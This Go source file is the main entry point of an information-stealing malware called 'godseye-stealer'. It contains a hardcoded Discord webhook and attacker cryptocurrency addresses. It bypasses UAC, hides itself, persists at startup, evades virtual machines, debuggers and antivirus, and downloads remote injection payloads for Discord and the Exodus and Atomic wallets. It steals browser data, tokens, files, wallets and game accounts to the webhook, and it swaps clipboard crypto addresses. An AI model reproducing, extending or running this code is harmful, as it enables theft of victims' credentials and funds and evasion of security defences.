package main

import (
	"github.com/rkrealizt/godseye-stealer/modules/antidebug"
	"github.com/rkrealizt/godseye-stealer/modules/antivm"
	"github.com/rkrealizt/godseye-stealer/modules/antivirus"
	"github.com/rkrealizt/godseye-stealer/modules/browsers"
	"github.com/rkrealizt/godseye-stealer/modules/clipper"
	"github.com/rkrealizt/godseye-stealer/modules/commonfiles"
	"github.com/rkrealizt/godseye-stealer/modules/discodes"
	"github.com/rkrealizt/godseye-stealer/modules/discordinjection"
	"github.com/rkrealizt/godseye-stealer/modules/fakeerror"
	"github.com/rkrealizt/godseye-stealer/modules/games"
	"github.com/rkrealizt/godseye-stealer/modules/hideconsole"
	"github.com/rkrealizt/godseye-stealer/modules/startup"
	"github.com/rkrealizt/godseye-stealer/modules/system"
	"github.com/rkrealizt/godseye-stealer/modules/tokens"
	"github.com/rkrealizt/godseye-stealer/modules/uacbypass"
	"github.com/rkrealizt/godseye-stealer/modules/wallets"
	"github.com/rkrealizt/godseye-stealer/modules/walletsinjection"
	"github.com/rkrealizt/godseye-stealer/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "https://discord.com/api/webhooks/1309575990778794014/e_k7aMxJRSVegm28v-BywLOMy5woPYezstyPSbbs3Pr0MCHA5CpPEMhKnJvLvWHqSFOM",
		"cryptos": map[string]string{
			"BTC": "bc1qmg2lvy8uw48wd50d64xvalk26pmr9853pd5z4d",
			"BCH": "qr4t2z6vpu7jx2ckakctg8tluu6znax86v0zsl4tjr",
			"ETH": "0x1fFf32075AFf6dCa2c1C606F71924859032a728B",
			"XMR": "42sesinVvyaBzK75iVBJ3Ugz9Ug6FmydGdWZ6xk2JyHsNdqaChpGzEabunRzwU5AQH3686wn3x9f99snbQXUtvgaGpxfaD3",
			"LTC": "LcZmU8LXQJdaWakrhEB1Vwy1CiHzygaXGQ",
			"XCH": "",
			"XLM": "GCGFQ6I7VZN3RT6INHV3D5UX3YFUIILVDUZSPCODJPGAXGL5IPW5KBIU",
			"TRX": "TPbeYP6LF2qhAPT1UtS9kRYve15XMwtNCg",
			"ADA": "addr1qywsst7fwnsyq704werww6zfz749f5jsgwhf2ju39xgv58gapqhuja8qgpul2ajxua5yj9a22nf9qsawj49ez2vsegwskmcchk",
			"DASH": "Xw7RkM4ZniM9TZ8xSjuZFk1JAkZhFzm8ur",
			"DOGE": "DQDKEyuRw4KjWMofpTkVsYG8MJzTeurmYV",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/rkrealizt/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/rkrealizt/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
